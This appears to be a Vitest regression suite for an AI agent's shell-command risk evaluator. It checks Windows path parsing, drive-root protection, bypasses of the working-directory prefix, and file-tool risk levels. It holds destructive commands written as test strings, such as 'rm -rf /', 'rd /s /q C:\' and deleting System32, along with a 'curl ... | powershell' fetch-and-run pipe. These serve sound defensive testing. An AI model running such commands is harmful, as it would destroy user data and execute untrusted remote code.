import { describe, it, expect } from 'vitest';

import { parseShellCommand } from '../../src/harness/security/shell-parser.js';
import {
  evaluateShellCommand,
  evaluateNonShellTool,
  resetSecurityPathCache,
} from '../../src/harness/security/risk-evaluator.js';
import type { ToolCall } from '../../src/core/types.js';

function tc(name: string, args: Record<string, unknown>): ToolCall {
  return { id: '1', name, arguments: args } as ToolCall;
}

/**
 * Windows 安全回归 — 真实单反斜杠路径（不要写成 JS 转义后的 \\）
 * 覆盖审查 P0/P1：tokenizer、盘符根、前缀绕过、cmd/PS 内联、删除命令。
 */
describe('Windows security regression', () => {
  const cwd = '/Users/me/project';

  describe('tokenizer preserves Windows paths', () => {
    it('keeps C:\\Windows\\System32 intact', () => {
      const parsed = parseShellCommand('rm -rf C:\\Windows\\System32');
      expect(parsed.segments[0].args).toContain('C:\\Windows\\System32');
      expect(parsed.segments[0].args).not.toContain('C:WindowsSystem32');
    });

    it('keeps UNC paths', () => {
      const parsed = parseShellCommand('rm -rf \\\\server\\share\\data');
      expect(parsed.segments[0].args).toContain('\\\\server\\share\\data');
    });

    it('still escapes bash metacharacters', () => {
      const parsed = parseShellCommand('echo foo\\ bar');
      expect(parsed.segments[0].args).toContain('foo bar');
    });
  });

  describe('drive roots and protected paths', () => {
    it('rm -rf C:\\Windows\\System32 → critical', () => {
      const risk = evaluateShellCommand('rm -rf C:\\Windows\\System32', cwd);
      expect(risk.level).toBe('critical');
    });

    it('rm -rf C:\\ → critical (drive root)', () => {
      const risk = evaluateShellCommand('rm -rf C:\\', cwd);
      expect(risk.level).toBe('critical');
    });

    it('rm -rf D:\\ → critical (drive root)', () => {
      const risk = evaluateShellCommand('rm -rf D:\\', cwd);
      expect(risk.level).toBe('critical');
    });

    it('rm -rf C:/Windows/System32 (forward slashes) → critical', () => {
      const risk = evaluateShellCommand('rm -rf C:/Windows/System32', cwd);
      expect(risk.level).toBe('critical');
    });
  });

  describe('cwd prefix bypass (project vs project-evil)', () => {
    it('project-evil is not treated as inside project', () => {
      const risk = evaluateShellCommand('rm -rf /Users/me/project-evil/x', cwd);
      expect(risk.level).not.toBe('low');
      // normal absolute path outside cwd → medium (recursive) or higher
      expect(['medium', 'high', 'critical']).toContain(risk.level);
    });

    it('projectX is not treated as inside project', () => {
      const risk = evaluateShellCommand('rm -rf /Users/me/projectX', cwd);
      expect(risk.level).not.toBe('low');
    });

    it('true project subpath remains low', () => {
      const risk = evaluateShellCommand('rm -rf /Users/me/project/sub', cwd);
      expect(risk.level).toBe('low');
    });

    it('Windows project-evil bypass', () => {
      const winCwd = 'C:\\Users\\me\\project';
      const risk = evaluateShellCommand('del /s /q C:\\Users\\me\\project-evil\\x', winCwd);
      // del is delete; project-evil not under project → not safe/low from cwd
      expect(risk.level).not.toBe('low');
    });
  });

  describe('cmd / start are not broken wrappers', () => {
    it('cmd /c keeps cmd as command and flags inline code', () => {
      const parsed = parseShellCommand('cmd /c echo hello');
      expect(parsed.segments[0].command).toBe('cmd');
      expect(parsed.hasInlineCode).toBe(true);
      const risk = evaluateShellCommand('cmd /c echo hello', cwd);
      expect(risk.level).toBe('high');
    });

    it('start is not unwrapped to /b', () => {
      const parsed = parseShellCommand('start /b calc.exe');
      expect(parsed.segments[0].command).toBe('start');
      expect(parsed.segments[0].command).not.toBe('/b');
    });
  });

  describe('PowerShell inline code', () => {
    it('powershell -Command → high', () => {
      const parsed = parseShellCommand('powershell -Command "Remove-Item -Recurse C:\\Windows"');
      expect(parsed.hasInlineCode).toBe(true);
      const risk = evaluateShellCommand(
        'powershell -Command "Remove-Item -Recurse C:\\Windows"',
        cwd,
      );
      expect(risk.level).toBe('high');
    });

    it('pwsh -EncodedCommand → high', () => {
      const parsed = parseShellCommand('pwsh -EncodedCommand AAAA');
      expect(parsed.hasInlineCode).toBe(true);
    });

    it('curl | powershell still high', () => {
      const risk = evaluateShellCommand('curl http://x | powershell', cwd);
      expect(risk.level).toBe('high');
    });
  });

  describe('Windows delete commands', () => {
    it('del on protected path → critical', () => {
      const risk = evaluateShellCommand('del /s /q C:\\Windows\\System32\\config', cwd);
      expect(risk.level).toBe('critical');
    });

    it('Remove-Item -Recurse on protected → high/critical', () => {
      const risk = evaluateShellCommand(
        'Remove-Item -Recurse "C:\\Program Files\\App"',
        cwd,
      );
      expect(['high', 'critical']).toContain(risk.level);
    });

    it('rd on drive root → critical', () => {
      const risk = evaluateShellCommand('rd /s /q C:\\', cwd);
      expect(risk.level).toBe('critical');
    });
  });

  describe('credential path segments', () => {
    it('.ssh directory is sensitive', () => {
      const risk = evaluateShellCommand('rm -rf /home/user/.ssh', cwd);
      expect(risk.level).toBe('high');
    });

    it('.sshrc is NOT treated as .ssh', () => {
      const risk = evaluateShellCommand('rm -f /home/user/.sshrc', cwd);
      // not sensitive from .ssh false positive; non-recursive delete of normal → low
      expect(risk.level).not.toBe('high');
      expect(risk.level).not.toBe('critical');
    });
  });

  describe('POSIX paths still work', () => {
    it('rm -rf /tmp/old → low', () => {
      const risk = evaluateShellCommand('rm -rf /tmp/old', cwd);
      expect(risk.level).toBe('low');
    });

    it('rm -rf /usr → critical', () => {
      const risk = evaluateShellCommand('rm -rf /usr', cwd);
      expect(risk.level).toBe('critical');
    });

    it('rm -rf / → critical', () => {
      const risk = evaluateShellCommand('rm -rf /', cwd);
      expect(risk.level).toBe('critical');
    });
  });

  describe('TEMP before PROTECTED (P1-1)', () => {
    it('C:\\Windows\\Temp\\x is safe, not protected', () => {
      const risk = evaluateShellCommand('rm -rf C:\\Windows\\Temp\\x', cwd);
      expect(risk.level).toBe('low');
    });

    it('del under C:\\Windows\\Temp is low', () => {
      const risk = evaluateShellCommand('del /s /q C:\\Windows\\Temp\\cache', cwd);
      expect(risk.level).toBe('low');
    });

    it('C:\\Windows\\System32 remains protected', () => {
      const risk = evaluateShellCommand('rm -rf C:\\Windows\\System32', cwd);
      expect(risk.level).toBe('critical');
    });
  });

  describe('file tools coverage (P1-2)', () => {
    it('file_edit on protected path → critical', () => {
      const risk = evaluateNonShellTool(tc('file_edit', { path: 'C:\\Windows\\evil' }));
      expect(risk.level).toBe('critical');
    });

    it('file_edit on .ssh → high', () => {
      const risk = evaluateNonShellTool(tc('file_edit', { path: 'C:\\Users\\me\\.ssh\\id_rsa' }));
      expect(risk.level).toBe('high');
    });

    it('file_read on protected → high (read, not write)', () => {
      const risk = evaluateNonShellTool(tc('file_read', { path: 'C:\\Windows\\evil' }));
      expect(risk.level).toBe('high');
    });

    it('file_list on protected → high', () => {
      const risk = evaluateNonShellTool(tc('file_list', { path: 'C:\\Windows' }));
      expect(risk.level).toBe('high');
    });

    it('file_search on protected → high', () => {
      const risk = evaluateNonShellTool(tc('file_search', { path: 'C:\\Windows', pattern: 'x' }));
      expect(risk.level).toBe('high');
    });

    it('file_write on protected → critical', () => {
      const risk = evaluateNonShellTool(tc('file_write', { path: 'C:\\Windows\\evil' }));
      expect(risk.level).toBe('critical');
    });

    it('legacy edit alias still critical', () => {
      const risk = evaluateNonShellTool(tc('edit', { path: 'C:\\Windows\\evil' }));
      expect(risk.level).toBe('critical');
    });
  });

  describe('write commands evaluate targets (P1-3)', () => {
    it('set-content on protected → critical', () => {
      const risk = evaluateShellCommand('set-content C:\\Windows\\evil.ps1', cwd);
      expect(risk.level).toBe('critical');
    });

    it('mkdir on protected → critical', () => {
      const risk = evaluateShellCommand('mkdir C:\\Windows\\foo', cwd);
      expect(risk.level).toBe('critical');
    });

    it('touch /etc/evil → critical', () => {
      const risk = evaluateShellCommand('touch /etc/evil', cwd);
      expect(risk.level).toBe('critical');
    });

    it('mkdir under project remains low', () => {
      const risk = evaluateShellCommand('mkdir /Users/me/project/sub', cwd);
      expect(risk.level).toBe('low');
    });
  });

  describe('unquoted Program Files merge (P2)', () => {
    it('del C:\\Program Files\\App\\x.exe merges and flags protected', () => {
      const parsed = parseShellCommand('del C:\\Program Files\\App\\x.exe');
      expect(parsed.segments[0].args).toContain('C:\\Program Files\\App\\x.exe');
      const risk = evaluateShellCommand('del C:\\Program Files\\App\\x.exe', cwd);
      expect(risk.level).toBe('critical');
    });

    it('does not merge cp source dest when dest has backslash but source has extension', () => {
      const parsed = parseShellCommand('cp C:\\data.txt backup\\old');
      // data.txt has extension → no merge
      expect(parsed.segments[0].args).toContain('C:\\data.txt');
      expect(parsed.segments[0].args).toContain('backup\\old');
    });
  });

  describe('path cache reset', () => {
    it('resetSecurityPathCache is callable', () => {
      resetSecurityPathCache();
      const risk = evaluateShellCommand('rm -rf C:\\Windows\\System32', cwd);
      expect(risk.level).toBe('critical');
    });
  });
});
